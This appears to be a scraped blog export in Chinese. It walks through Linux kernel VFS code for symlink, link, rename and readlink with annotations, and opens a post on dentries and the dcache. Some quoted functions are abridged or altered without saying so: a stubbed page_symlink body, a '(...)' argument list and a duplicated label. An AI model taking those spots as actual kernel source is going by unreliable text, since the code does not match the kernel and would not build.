12345678910111213141516171819202122232425262728293031int do_symlinkat(struct filename *from, int newdfd, struct filename *to)&#123; int error; struct dentry *dentry; struct path path; unsigned int lookup_flags = 0; if (IS_ERR(from)) &#123; error = PTR_ERR(from); goto out_putnames; &#125;retry: dentry = filename_create(newdfd, to, &amp;path, lookup_flags); // 创建dentry和path error = PTR_ERR(dentry); if (IS_ERR(dentry)) goto out_putnames; error = security_path_symlink(&amp;path, dentry, from-&gt;name); // 检查路径的安全性 if (!error) error = vfs_symlink(mnt_idmap(path.mnt), path.dentry-&gt;d_inode, dentry, from-&gt;name); // 调用vfs_symlink创建符号链接 done_path_create(&amp;path, dentry); // 完成路径和dentry的创建 if (retry_estale(error, lookup_flags)) &#123; lookup_flags |= LOOKUP_REVAL; goto retry; &#125;out_putnames: putname(to); // 释放to的名称 putname(from); // 释放from的名称 return error;&#125; 123456SYSCALL_DEFINE3(symlinkat, const char __user *, oldname,int, newdfd, const char __user *, newname)&#123;return do_symlinkat(getname(oldname), newdfd, getname(newname));&#125;//这是一个名为symlinkat的系统调用函数定义。它接受三个参数：oldname（指向旧文件名的用户空间指针）、newdfd（新文件描述符）和newname（指向新文件名的用户空间指针）。该函数的作用是在指定的目录中创建一个符号链接。 12345SYSCALL_DEFINE2(symlink, const char __user *, oldname, const char __user *, newname)&#123;return do_symlinkat(getname(oldname), AT_FDCWD, getname(newname));&#125;//这是一个名为symlink的系统调用函数定义。它接受两个参数：oldname（指向旧文件名的用户空间指针）和newname（指向新文件名的用户空间指针）。该函数的作用是在当前工作目录中创建一个符号链接。它调用了do_symlinkat函数，将AT_FDCWD作为新文件描述符传递给它，表示当前工作目录。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/** * vfs_link - 创建一个新的硬链接 * @old_dentry:要链接的对象 * @idmap:挂载点的idmap * @dir:新的父目录 * @new_dentry:新链接的位置 * @delegated_inode: 需要中断委托的inode * * 调用者必须持有dir-&gt;i_mutex * * 如果vfs_link发现需要中断的待链接文件上存在委托，它将返回-EWOULDBLOCK，并返回对委托inode的引用。 * 调用者应该在中断委托之前释放i_mutex并重试。因为中断委托可能需要很长时间，所以调用者应该在这样做之前释放i_mutex。 * * 或者，调用者可以将delegated_inode传递为NULL。这对于预期底层文件系统不是NFS导出的调用者可能是合适的。 * * 如果通过idmapped挂载找到了inode，则必须通过@idmap传递vfsmount的idmap。此函数将负责根据@idmap映射inode，然后检查权限。 * 对于非idmapped挂载或者如果要对原始inode执行权限检查，只需传递@nop_mnt_idmap。 */int vfs_link(struct dentry *old_dentry, struct mnt_idmap *idmap, struct inode *dir, struct dentry *new_dentry, struct inode **delegated_inode)&#123;struct inode *inode = old_dentry-&gt;d_inode;unsigned max_links = dir-&gt;i_sb-&gt;s_max_links;int error;if (!inode)return -ENOENT;error = may_create(idmap, dir, new_dentry);if (error)return error;if (dir-&gt;i_sb != inode-&gt;i_sb)return -EXDEV;/* * 不能创建指向只追加或只读的文件的链接。 */if (IS_APPEND(inode) || IS_IMMUTABLE(inode))return -EPERM;/* * 如果真实值对于vfs未知，更新链接计数可能会导致i_uid和i_gid被错误地写回。 */if (HAS_UNMAPPED_ID(idmap, inode))return -EPERM;if (!dir-&gt;i_op-&gt;link)return -EPERM;if (S_ISDIR(inode-&gt;i_mode))return -EPERM;error = security_inode_link(old_dentry, dir, new_dentry);if (error)return error;inode_lock(inode);/* 确保我们不允许创建指向未链接文件的硬链接 */if (inode-&gt;i_nlink == 0 &amp;&amp; !(inode-&gt;i_state &amp; I_LINKABLE))error = -ENOENT;else if (max_links &amp;&amp; inode-&gt;i_nlink &gt;= max_links)error = -EMLINK;else &#123;error = try_break_deleg(inode, delegated_inode);if (!error)error = dir-&gt;i_op-&gt;link(old_dentry, dir, new_dentry);&#125;if (!error &amp;&amp; (inode-&gt;i_state &amp; I_LINKABLE)) &#123;spin_lock(&amp;inode-&gt;i_lock);inode-&gt;i_state &amp;= ~I_LINKABLE;spin_unlock(&amp;inode-&gt;i_lock);&#125;inode_unlock(inode);if (!error)fsnotify_link(dir, inode, new_dentry);return error;&#125;EXPORT_SYMBOL(vfs_link); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980/* * Hardlinks are often used in delicate situations. We avoid * security-related surprises by not following symlinks on the * newname. --KAB * * We don&#x27;t follow them on the oldname either to be compatible * with linux 2.0, and to avoid hard-linking to directories * and other special files. --ADM */int do_linkat(int olddfd, struct filename *old, int newdfd, struct filename *new, int flags)&#123;struct mnt_idmap *idmap; // 挂载ID映射struct dentry *new_dentry; // 新文件的目录项struct path old_path, new_path; // 旧文件和新文件的路径struct inode *delegated_inode = NULL; // 委派的inodeint how = 0; // 查找标志int error; // 错误码if ((flags &amp; ~(AT_SYMLINK_FOLLOW | AT_EMPTY_PATH)) != 0) &#123;error = -EINVAL; // 无效的标志goto out_putnames;&#125;/* * To use null names we require CAP_DAC_READ_SEARCH * This ensures that not everyone will be able to create * handlink using the passed filedescriptor. */if (flags &amp; AT_EMPTY_PATH &amp;&amp; !capable(CAP_DAC_READ_SEARCH)) &#123;error = -ENOENT; // 无法使用空名称创建硬链接goto out_putnames;&#125;if (flags &amp; AT_SYMLINK_FOLLOW)how |= LOOKUP_FOLLOW; // 启用跟随符号链接retry:error = filename_lookup(olddfd, old, how, &amp;old_path, NULL); // 查找旧文件if (error)goto out_putnames;new_dentry = filename_create(newdfd, new, &amp;new_path,(how &amp; LOOKUP_REVAL)); // 创建新文件的目录项error = PTR_ERR(new_dentry);if (IS_ERR(new_dentry))goto out_putpath;error = -EXDEV; // 不允许跨设备硬链接if (old_path.mnt != new_path.mnt)goto out_dput;idmap = mnt_idmap(new_path.mnt); // 获取挂载ID映射error = may_linkat(idmap, &amp;old_path); // 检查是否有权限创建硬链接if (unlikely(error))goto out_dput;error = security_path_link(old_path.dentry, &amp;new_path, new_dentry); // 安全检查if (error)goto out_dput;error = vfs_link(old_path.dentry, idmap, new_path.dentry-&gt;d_inode, new_dentry, &amp;delegated_inode); // 创建硬链接out_dput:done_path_create(&amp;new_path, new_dentry); // 释放新文件的路径和目录项if (delegated_inode) &#123;error = break_deleg_wait(&amp;delegated_inode); // 中断委派并重试链接操作if (!error) &#123;path_put(&amp;old_path);goto retry;&#125;&#125;if (retry_estale(error, how)) &#123;path_put(&amp;old_path);how |= LOOKUP_REVAL; // 重新验证文件句柄goto retry;&#125;out_putpath:path_put(&amp;old_path); // 释放旧文件的路径out_putnames:putname(old); // 释放旧文件的文件名putname(new); // 释放新文件的文件名return error; // 返回错误码&#125; 12345678910111213141516SYSCALL_DEFINE5(linkat, int, olddfd, const char __user *, oldname,int, newdfd, const char __user *, newname, int, flags)&#123;return do_linkat(olddfd, getname_uflags(oldname, flags),newdfd, getname(newname), flags);&#125;// 定义系统调用函数linkat，接受五个参数：olddfd表示旧目录文件描述符，oldname表示旧文件路径名，// newdfd表示新目录文件描述符，newname表示新文件路径名，flags表示链接选项SYSCALL_DEFINE2(link, const char __user \\*, oldname, const char __user *, newname)&#123;return do_linkat(AT_FDCWD, getname(oldname), AT_FDCWD, getname(newname), 0);&#125;// 定义系统调用函数link，接受两个参数：oldname表示旧文件路径名，newname表示新文件路径名。// 在函数内部调用linkat系统调用函数，使用AT_FDCWD作为旧目录文件描述符和新目录文件描述符，// 通过getname函数获取旧文件路径名和新文件路径名，并将链接选项设置为0。 1234567891011121314151617181920212223242526272829303132333435/*** vfs_rename - 重命名一个文件系统对象 * @rd: 指向重命名信息的renamedata结构体指针** 调用者必须持有多个互斥锁 - 参见lock_rename()。* * 如果vfs_rename在源目录或目标目录发现需要破坏的委托,* 它将返回-EWOULDBLOCK并返回delegated_inode中的一个inode引用。* 调用者应该断开委托并重试。由于断开委托可能需要很长时间,* 调用者应该在此之前释放所有锁。** 或者,调用者可以为delegated_inode传入NULL。* 这可能适合预期底层文件系统没有NFS导出的调用者。** 命名空间操作中最糟糕的是重命名目录。“不正当”甚至无法开始描述它。* 加州大学伯克利分校的某人trip了一场......问题:* * a) 我们可能进入循环创建。* b) 竞争风险 - 两个无辜的重命名可以一起创建一个循环。* 这就是4.4出错的地方。 当前修复: 在sb-&gt;s_vfs_rename_mutex上序列化。* 我们可能会更准确,但那是另一个故事。* c) 我们必须锁定四个对象 – 父目录和受害者(如果存在),* 以及源(如果它不是一个目录)。* 而且 - 在我们对父目录获取-&gt;i_mutex之后(直到然后我们不知道目标是否存在)。* 解决方案: 尝试通过锁定顺序来智能锁定节点。 我们依赖这样的事实:* 仅在-&gt;s_vfs_rename_mutex下才能改变树拓扑,_and_ 对象的父目录我们移动将被锁定。* 这样,我们可以通过树(先祖先)对目录进行排名,并在它们之后排名所有非目录。* 这有效,因为除了重命名之外的所有对象都“锁定父目录,查找,锁定子目录”,* 而重命名在-&gt;s_vfs_rename_mutex下。* 然而,它依赖于这样的假设:任何具有-&gt;lookup()的对象都不会有多个dentry。* 如果“混合”对象出现,我们最好确保它们没有链接(2)。* d) 从fhandle转换为dentry可能在错误的时刻到来 - 当我们删除目标时。* 解决方案:我们将不得不在fhandle_to_dentry代码中获取-&gt;i_mutex。* [FIXME - 当前的nfsfh.c依赖于父-&gt;i_mutex,这有效但导致一些非常过度的锁定]。*/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194int vfs_rename(struct renamedata *rd)&#123; // 声明错误码 int error; // 声明老目录和新目录的inode指针 struct inode *old_dir = rd-&gt;old_dir, *new_dir = rd-&gt;new_dir; // 声明老目录项和新目录项的dentry指针 struct dentry *old_dentry = rd-&gt;old_dentry; struct dentry *new_dentry = rd-&gt;new_dentry; // 委托inode指针 struct inode **delegated_inode = rd-&gt;delegated_inode; // 标志 unsigned int flags = rd-&gt;flags; // 老目录项是否是目录 bool is_dir = d_is_dir(old_dentry); // 老目录项对应的inode struct inode *source = old_dentry-&gt;d_inode; // 新目录项对应的inode struct inode *target = new_dentry-&gt;d_inode; // 新目录项是否是目录 bool new_is_dir = false; // 最大链接数 unsigned max_links = new_dir-&gt;i_sb-&gt;s_max_links; // 老目录项名称快照 struct name_snapshot old_name; // 如果源和目标是同一个inode,返回0 if (source == target) return 0; // 检查删除老目录项的权限 error = may_delete(rd-&gt;old_mnt_idmap, old_dir, old_dentry, is_dir); if (error) return error; // 如果目标目录项不存在,检查新建目录项的权限 if (!target) &#123; error = may_create(rd-&gt;new_mnt_idmap, new_dir, new_dentry); &#125; else &#123; // 目标目录项是否是目录 new_is_dir = d_is_dir(new_dentry); // 如果不是交换重命名,检查删除目标目录项的权限 if (!(flags &amp; RENAME_EXCHANGE)) error = may_delete(rd-&gt;new_mnt_idmap, new_dir, new_dentry, is_dir); else // 如果是交换重命名,检查删除新目录项的权限 error = may_delete(rd-&gt;new_mnt_idmap, new_dir, new_dentry, new_is_dir); &#125; if (error) return error; // 检查老目录inode是否支持重命名操作 if (!old_dir-&gt;i_op-&gt;rename) return -EPERM; // 如果更改父目录,检查写权限,需要翻转“..” if (new_dir != old_dir) &#123; if (is_dir) &#123; // 如果源是目录,检查写权限 error = inode_permission(rd-&gt;old_mnt_idmap, source, MAY_WRITE); if (error) return error; &#125; if ((flags &amp; RENAME_EXCHANGE) &amp;&amp; new_is_dir) &#123; // 如果交换重命名且新目录项是目录,检查目标写权限 error = inode_permission(rd-&gt;new_mnt_idmap, target, MAY_WRITE); if (error) return error; &#125; &#125; // 安全检查 error = security_inode_rename(...); if (error) return error; // 获取老目录项名称快照 take_dentry_name_snapshot(&amp;old_name, old_dentry); // 增加新目录项引用计数 dget(new_dentry); // 加锁 if (!is_dir || (flags &amp; RENAME_EXCHANGE)) lock_two_nondirectories(source, target); else if (target) inode_lock(target); // 权限检查 error = -EPERM; if (IS_SWAPFILE(source) || (target &amp;&amp; IS_SWAPFILE(target))) goto out; // 检查挂载点 error = -EBUSY; if (is_local_mountpoint(old_dentry) || is_local_mountpoint(new_dentry)) goto out; // 检查最大链接数 if (max_links &amp;&amp; new_dir != old_dir) &#123; error = -EMLINK; if (is_dir &amp;&amp; !new_is_dir &amp;&amp; new_dir-&gt;i_nlink &gt;= max_links) goto out; if ((flags &amp; RENAME_EXCHANGE) &amp;&amp; !is_dir &amp;&amp; new_is_dir &amp;&amp; old_dir-&gt;i_nlink &gt;= max_links) goto out; &#125; // 尝试中断委托 if (!is_dir) &#123; error = try_break_deleg(source, delegated_inode); if (error) goto out; &#125; if (target &amp;&amp; !new_is_dir) &#123; error = try_break_deleg(target, delegated_inode); if (error) goto out; &#125; // 调用目录inode的重命名方法 error = old_dir-&gt;i_op-&gt;rename(rd-&gt;new_mnt_idmap, old_dir, old_dentry, new_dir, new_dentry, flags); if (error) goto out; // 如果不是交换重命名且目标目录项存在 if (!(flags &amp; RENAME_EXCHANGE) &amp;&amp; target) &#123; // 如果源是目录 if (is_dir) &#123; // 缩小新目录项的dcache shrink_dcache_parent(new_dentry); // 标记目标inode已死 target-&gt;i_flags |= S_DEAD; &#125; // 禁止在新目录项挂载 dont_mount(new_dentry); // 分离新目录项的挂载 detach_mounts(new_dentry);&#125;// 如果文件系统不支持d_moveif (!(old_dir-&gt;i_sb-&gt;s_type-&gt;fs_flags &amp; FS_RENAME_DOES_D_MOVE)) &#123; // 如果不是交换重命名 if (!(flags &amp; RENAME_EXCHANGE)) // 移动老目录项到新目录项 d_move(old_dentry, new_dentry); else // 交换两个目录项 d_exchange(old_dentry, new_dentry);&#125;// 解锁out:if (!is_dir || (flags &amp; RENAME_EXCHANGE)) unlock_two_nondirectories(source, target);else if (target) inode_unlock(target);// 减少新目录项的引用计数 dput(new_dentry);if (!error) &#123; // 发送目录项移动事件通知 fsnotify_move(old_dir, new_dir, &amp;old_name.name, is_dir, !(flags &amp; RENAME_EXCHANGE) ? target : NULL, old_dentry); if (flags &amp; RENAME_EXCHANGE) &#123; // 如果是交换重命名,交换事件通知参数 fsnotify_move(new_dir, old_dir, &amp;old_dentry-&gt;d_name, new_is_dir, NULL, new_dentry); &#125;&#125;// 释放老目录项名称快照release_dentry_name_snapshot(&amp;old_name);// 返回错误码return error;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181/** do_renameat2 - 实现重命名系统调用renameat2* @olddfd: 源文件目录文件描述符* @from: 源文件名* @newdfd: 目标文件目录文件描述符 * @to: 目标文件名* @flags: 标志位** 返回值:* 0 - 成功* 负值 - 错误码*/int do_renameat2(int olddfd, struct filename *from, int newdfd, struct filename *to, unsigned int flags)&#123; // 重命名数据 struct renamedata rd; // 源目录项和目标目录项 struct dentry *old_dentry, *new_dentry; // 锁定时用于检测环的中间目录项 struct dentry *trap; // 源路径和目标路径 struct path old_path, new_path; // 源目录项和目标目录项最后一个component struct qstr old_last, new_last; // 目录项类型 int old_type, new_type; // 委托的inode struct inode *delegated_inode = NULL; // 查找标志 unsigned int lookup_flags = 0, target_flags = LOOKUP_RENAME_TARGET; // 是否需要重试标志 bool should_retry = false; int error = -EINVAL; // 参数检查 if (flags &amp; ~(RENAME_NOREPLACE | RENAME_EXCHANGE | RENAME_WHITEOUT)) goto put_names; if ((flags &amp; (RENAME_NOREPLACE | RENAME_WHITEOUT)) &amp;&amp; (flags &amp; RENAME_EXCHANGE)) goto put_names; if (flags &amp; RENAME_EXCHANGE) target_flags = 0;retry: // 获取源文件路径 error = filename_parentat(olddfd, from, lookup_flags, &amp;old_path, &amp;old_last, &amp;old_type); if (error) goto put_names; // 获取目标文件路径 error = filename_parentat(newdfd, to, lookup_flags, &amp;new_path, &amp;new_last, &amp;new_type); if (error) goto exit1; // 不同文件系统 error = -EXDEV; if (old_path.mnt != new_path.mnt) goto exit2; // 源文件类型错误 error = -EBUSY; if (old_type != LAST_NORM) goto exit2; // 目标已存在,不能覆盖 if (flags &amp; RENAME_NOREPLACE) error = -EEXIST; if (new_type != LAST_NORM) goto exit2; // 获取写权限 error = mnt_want_write(old_path.mnt); if (error) goto exit2;retry_deleg: // 加锁 trap = lock_rename(new_path.dentry, old_path.dentry); // 查找源目录项 old_dentry = __lookup_hash(&amp;old_last, old_path.dentry, lookup_flags); error = PTR_ERR(old_dentry); if (IS_ERR(old_dentry)) goto exit3; // 源目录项必须存在 error = -ENOENT; if (d_is_negative(old_dentry)) goto exit4; // 查找目标目录项 new_dentry = __lookup_hash(&amp;new_last, new_path.dentry, lookup_flags | target_flags); error = PTR_ERR(new_dentry); if (IS_ERR(new_dentry)) goto exit4; // 目标已存在,不能覆盖 error = -EEXIST; if ((flags &amp; RENAME_NOREPLACE) &amp;&amp; d_is_positive(new_dentry)) goto exit5; // 类型检查 if (flags &amp; RENAME_EXCHANGE) &#123; error = -ENOENT; if (d_is_negative(new_dentry)) goto exit5; if (!d_is_dir(new_dentry)) &#123; error = -ENOTDIR; if (new_last.name[new_last.len]) goto exit5; &#125; &#125; // 安全检查 error = security_path_rename(&amp;old_path, old_dentry, &amp;new_path, new_dentry, flags); if (error) goto exit5; // 准备重命名数据 rd.old_dir = old_path.dentry-&gt;d_inode; rd.old_dentry = old_dentry; rd.old_mnt_idmap = mnt_idmap(old_path.mnt); rd.new_dir = new_path.dentry-&gt;d_inode; rd.new_dentry = new_dentry; rd.new_mnt_idmap = mnt_idmap(new_path.mnt); rd.delegated_inode = &amp;delegated_inode; rd.flags = flags; // 执行重命名 error = vfs_rename(&amp;rd);exit5: // 释放资源exit5: dput(new_dentry);exit4: dput(old_dentry);exit3: unlock_rename(new_path.dentry, old_path.dentry); if (delegated_inode) &#123; error = break_deleg_wait(&amp;delegated_inode); if (!error) goto retry_deleg; &#125; mnt_drop_write(old_path.mnt);exit2: if (retry_estale(error, lookup_flags)) should_retry = true; path_put(&amp;new_path);exit1: path_put(&amp;old_path); if (should_retry) &#123; should_retry = false; lookup_flags |= LOOKUP_REVAL; goto retry; &#125;put_names: putname(from); putname(to); return error;&#125; 12345678910111213141516171819202122232425262728293031323334// renameat2系统调用实现SYSCALL_DEFINE5(renameat2, int, olddfd, const char __user *, oldname, int, newdfd, const char __user *, newname, unsigned int, flags)&#123; // 调用do_renameat2实现重命名并返回结果 return do_renameat2(olddfd, getname(oldname), newdfd, getname(newname), flags); &#125;// renameat系统调用实现SYSCALL_DEFINE4(renameat, int, olddfd, const char __user *, oldname, int, newdfd, const char __user *, newname) &#123; // 调用do_renameat2实现重命名, flags为0 return do_renameat2(olddfd, getname(oldname), newdfd, getname(newname), 0);&#125;// rename系统调用实现SYSCALL_DEFINE2(rename, const char __user *, oldname, const char __user *, newname)&#123; // 调用do_renameat2实现重命名, dfd为默认目录,flags为0 return do_renameat2(AT_FDCWD, getname(oldname), AT_FDCWD, getname(newname), 0); &#125;renameat2/renameat/rename系统调用都是利用do_renameat2函数实现文件重命名功能,主要区别在于:- renameat2可以指定标志位来控制重命名行为- renameat可以指定源目录文件描述符和目标目录文件描述符- rename使用当前工作目录和默认标志它们最终都通过do_renameat2统一实现了重命名文件的核心逻辑。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119/*** readlink_copy - 将符号链接目标复制到用户空间缓冲区* @buffer: 用户空间缓冲区指针* @buflen: 缓冲区大小 * @link: 符号链接目标字符串** 返回值:* &gt;0 - 复制的字节数* 负值 - 错误码*/int readlink_copy(char __user *buffer, int buflen, const char *link)&#123; // 获取符号链接目标字符串长度 int len = PTR_ERR(link); if (IS_ERR(link)) goto out; // 计算字符串长度 len = strlen(link); if (len &gt; (unsigned) buflen) len = buflen; // 复制到用户空间 if (copy_to_user(buffer, link, len)) len = -EFAULT;out: // 返回复制的字节数 return len;&#125;/*** vfs_readlink - 将符号链接目标复制到用户空间缓冲区* @dentry: 符号链接dentry* @buffer: 用户空间缓冲区指针* @buflen: 缓冲区大小** 不更新访问时间。调用者如果需要的话可以更新。** 不调用安全钩子。*/int vfs_readlink(struct dentry *dentry, char __user *buffer, int buflen)&#123; // 获取符号链接对应的inode struct inode *inode = d_inode(dentry); // 延迟调用结构体 DEFINE_DELAYED_CALL(done); // 符号链接目标字符串 const char *link; int res; // 检查inode操作 if (unlikely(!(inode-&gt;i_opflags &amp; IOP_DEFAULT_READLINK))) &#123; // 自定义readlink回调 if (unlikely(inode-&gt;i_op-&gt;readlink)) return inode-&gt;i_op-&gt;readlink(dentry, buffer, buflen); // 不是符号链接 if (!d_is_symlink(dentry)) return -EINVAL; // 设置默认readlink标志 spin_lock(&amp;inode-&gt;i_lock); inode-&gt;i_opflags |= IOP_DEFAULT_READLINK; spin_unlock(&amp;inode-&gt;i_lock); &#125; // 获取符号链接目标字符串 link = READ_ONCE(inode-&gt;i_link); if (!link) &#123; link = inode-&gt;i_op-&gt;get_link(dentry, inode, &amp;done); if (IS_ERR(link)) return PTR_ERR(link); &#125; // 复制到用户空间 res = readlink_copy(buffer, buflen, link); // 延迟调用 do_delayed_call(&amp;done); return res;&#125;EXPORT_SYMBOL(vfs_readlink);/*** vfs_get_link - 获取符号链接目标字符串 * @dentry: 符号链接dentry* @done: 调用者需要用此释放返回的数据** 调用安全钩子和i_op-&gt;get_link()。** 不更新访问时间。调用者如果需要可以更新。** 不适用于特殊符号链接,如/proc/$$/fd/N。*/const char *vfs_get_link(struct dentry *dentry, struct delayed_call *done)&#123; // 默认为错误 const char *res = ERR_PTR(-EINVAL); // 获取符号链接对应inode struct inode *inode = d_inode(dentry); // 如果是符号链接 if (d_is_symlink(dentry)) &#123; // 调用安全钩子 res = ERR_PTR(security_inode_readlink(dentry)); if (!res) // 调用get_link回调获取目标字符串 res = inode-&gt;i_op-&gt;get_link(dentry, inode, done); &#125; return res;&#125;EXPORT_SYMBOL(vfs_get_link); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798/*** page_get_link - 将符号链接内容读入页面缓存* @dentry: 符号链接对应的dentry* @inode: 符号链接对应的inode* @callback: 延迟调用回调函数** 返回值: 符号链接内容的内核空间地址*/const char *page_get_link(struct dentry *dentry, struct inode *inode, struct delayed_call *callback)&#123; char *kaddr; struct page *page; struct address_space *mapping = inode-&gt;i_mapping; if (!dentry) &#123; // 没有dentry,则分配新页 page = find_get_page(mapping, 0); if (!page) return ERR_PTR(-ECHILD); if (!PageUptodate(page)) &#123; put_page(page); return ERR_PTR(-ECHILD); &#125; &#125; else &#123; // 有dentry,则直接读取第一页 page = read_mapping_page(mapping, 0, NULL); if (IS_ERR(page)) return (char*)page; &#125; // 设置页面释放的延迟调用 set_delayed_call(callback, page_put_link, page); BUG_ON(mapping_gfp_mask(mapping) &amp; __GFP_HIGHMEM); // 获取页面对应的内核虚拟地址 kaddr = page_address(page); // 处理符号链接内容 nd_terminate_link(kaddr, inode-&gt;i_size, PAGE_SIZE - 1); return kaddr;&#125;EXPORT_SYMBOL(page_get_link);/*** page_put_link - 释放页面* @arg: 要释放的页面*/void page_put_link(void *arg)&#123; put_page(arg);&#125;EXPORT_SYMBOL(page_put_link);/*** page_readlink - 使用页面缓存读取符号链接内容* @dentry: 符号链接对应的dentry* @buffer: 用户空间缓冲区* @buflen: 缓冲区长度** 返回值:复制的字节数或错误码*/ int page_readlink(struct dentry *dentry, char __user *buffer, int buflen)&#123; DEFINE_DELAYED_CALL(done); int res = readlink_copy(buffer, buflen, page_get_link(dentry, d_inode(dentry), &amp;done)); do_delayed_call(&amp;done); return res;&#125;EXPORT_SYMBOL(page_readlink);/*** page_symlink - 用页面缓存创建符号链接* @inode: 符号链接对应的inode* @symname: 符号链接内容* @len: 内容长度** 返回值:0 或 错误码*/int page_symlink(struct inode *inode, const char *symname, int len)&#123; // 获得地址空间 // 写入符号链接内容 // 写入结束 // 标记inode已脏 mark_inode_dirty(inode); return 0;&#125;EXPORT_SYMBOL(page_symlink);/*** page_symlink_inode_operations - 使用页面缓存的符号链接inode操作*/const struct inode_operations page_symlink_inode_operations = &#123; .get_link = page_get_link,&#125;;EXPORT_SYMBOL(page_symlink_inode_operations);","categories":[],"tags":[]},{"title":"学习 Linux VFS虚拟文件系统 dentry详解和dcache实现","slug":"学习-Linux-VFS虚拟文件系统 dentry详解和dcache实现","date":"2023-07-18T07:15:54.000Z","updated":"2023-12-15T06:54:20.322Z","comments":true,"path":"2023/07/18/学习-Linux-VFS虚拟文件系统 dentry详解和dcache实现/","link":"","permalink":"http://example.com/2023/07/18/%E5%AD%A6%E4%B9%A0-Linux-VFS%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%20dentry%E8%AF%A6%E8%A7%A3%E5%92%8Cdcache%E5%AE%9E%E7%8E%B0/","excerpt":"简介一个dentry结构体代表文件系统中的一个目录或文件，vfs使用基于dentry构建的dentry树来管理整个系统的目录树结构。当然，对于大型系统不可能把整个系统的目录树都塞进内存，dentry cache就负责维护系统目录树中最常用的项目，并采用lru的淘汰策略淘汰最近不使用的项目，维持整个dentry cache中项目数量的稳定。 并且dentry缓存在一定程度上控制着inode缓存。","text":"简介一个dentry结构体代表文件系统中的一个目录或文件，vfs使用基于dentry构建的dentry树来管理整个系统的目录树结构。当然，对于大型系统不可能把整个系统的目录树都塞进内存，dentry cache就负责维护系统目录树中最常用的项目，并采用lru的淘汰策略淘汰最近不使用的项目，维持整个dentry cache中项目数量的稳定。 并且dentry缓存在一定程度上控制着inode缓存。 dentry的三种状态 未使用（unused）状态：该dentry对象的引用计数d_count的值为0，但其d_inode指针仍然指向相关的的索引节点。该目录项仍然包含有效的信息，只是当前没有人引用他。这种dentry对象在回收内存时可能会被释放。所有unused的dentry都包含在 “Least Recently Used” - LRU List中 正在使用（inuse）状态：处于该状态下的dentry对象的引用计数d_count大于0，且其d_inode指向相关的inode对象。这种dentry对象不能被释放。 负（negative）状态：与目录项相关的inode对象不复存在（相应的磁盘索引节点可能已经被删除），dentry对象的d_inode指针为NULL。但这种dentry对象仍然保存在dcache中，以便后续对同一文件名的查找能够快速完成。这种dentry对象在回收内存时将首先被释放。 dentry_hashtable我们所说的dcache，指的是目录项高速缓存，主要是用于高效处理路径解析查找，它实际上由两部分组成：dentry_hashtable哈希表和dentry_unused链表。 dentry_hashtable定义如下 dentry_hashtable identifier - Linux source code (v6.3.8) - Bootlin 1static struct hlist_bl_head *dentry_hashtable __read_mostly; __read_mostly宏表示此处会经常被读取，内核加载时将其存放在cache中。 1#define __read_mostly __section(&quot;.data..read_mostly&quot;) _read_mostly修饰的变量均放在.data..read_mostly段中。 dcache初始化dentry cache在内核启动时完成初始化。内核的启动入口函数是init/main.c文件的start_kernel函数，start_kernel函数会调用vfs_caches_init函数，并调用dcache_init函数来完成dentry cache的初始化。 main.c - init&#x2F;main.c - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212asmlinkage __visible void __init __no_sanitize_address start_kernel(void)&#123; char *command_line; char *after_dashes; set_task_stack_end_magic(&amp;init_task); smp_setup_processor_id(); debug_objects_early_init(); init_vmlinux_build_id(); cgroup_init_early(); local_irq_disable(); early_boot_irqs_disabled = true; /* * Interrupts are still disabled. Do necessary setups, then * enable them. */ boot_cpu_init(); page_address_init(); pr_notice(&quot;%s&quot;, linux_banner); early_security_init(); setup_arch(&amp;command_line); setup_boot_config(); setup_command_line(command_line); setup_nr_cpu_ids(); setup_per_cpu_areas(); smp_prepare_boot_cpu(); /* arch-specific boot-cpu hooks */ boot_cpu_hotplug_init(); build_all_zonelists(NULL); page_alloc_init(); pr_notice(&quot;Kernel command line: %s\\n&quot;, saved_command_line); /* parameters may set static keys */ jump_label_init(); parse_early_param(); after_dashes = parse_args(&quot;Booting kernel&quot;, static_command_line, __start___param, __stop___param - __start___param, -1, -1, NULL, &amp;unknown_bootoption); print_unknown_bootoptions(); if (!IS_ERR_OR_NULL(after_dashes)) parse_args(&quot;Setting init args&quot;, after_dashes, NULL, 0, -1, -1, NULL, set_init_arg); if (extra_init_args) parse_args(&quot;Setting extra init args&quot;, extra_init_args, NULL, 0, -1, -1, NULL, set_init_arg); /* Architectural and non-timekeeping rng init, before allocator init */ random_init_early(command_line); /* * These use large bootmem allocations and must precede * kmem_cache_init() */ setup_log_buf(0); vfs_caches_init_early(); sort_main_extable(); trap_init(); mm_init(); poking_init(); ftrace_init(); /* trace_printk can be enabled here */ early_trace_init(); /* * Set up the scheduler prior starting any interrupts (such as the * timer interrupt). Full topology setup happens at smp_init() * time - but meanwhile we still have a functioning scheduler. */ sched_init(); if (WARN(!irqs_disabled(), &quot;Interrupts were enabled *very* early, fixing it\\n&quot;)) local_irq_disable(); radix_tree_init(); maple_tree_init(); /* * Set up housekeeping before setting up workqueues to allow the unbound * workqueue to take non-housekeeping into account. */ housekeeping_init(); /* * Allow workqueue creation and work item queueing/cancelling * early. Work item execution depends on kthreads and starts after * workqueue_init(). */ workqueue_init_early(); rcu_init(); /* Trace events are available after this */ trace_init(); if (initcall_debug) 